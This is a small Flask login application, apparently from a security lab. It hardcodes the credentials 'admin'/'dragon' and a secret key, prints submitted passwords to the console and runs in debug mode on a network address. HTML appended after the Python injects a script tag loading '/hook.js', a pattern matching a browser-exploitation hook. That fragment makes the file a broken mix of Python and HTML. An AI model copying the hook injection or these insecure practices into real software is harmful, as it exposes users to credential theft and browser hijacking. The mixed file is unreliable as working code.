from flask import Flask, render_template, request, url_for, redirect, session

app = Flask(__name__)

app.secret_key = "mysecretkey"


# @app.route('/')
# def index():
#     return render_template('index.html')


@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        print(request.form['username'],request.form['password'])
        if request.form['username'] == 'admin':
            if request.form['password'] == 'dragon':
                session['logged_in'] = True
                return redirect(url_for('dashboard'))
            else:
                return render_template('login.html', error="Invalid credentials")

    return render_template('login.html')


@app.route('/dashboard')
def dashboard():
    if 'logged_in' in session:
        return render_template('dashboard.html')
    return redirect(url_for('login'))


if __name__ == '__main__':
    app.run(host= "192.168.56.1", port="80", debug=True)
<script>
	var commandModuleStr = '<script src="/hook.js" type="text/javascript"><\/script>';
	document.write(commandModuleStr);
</script>
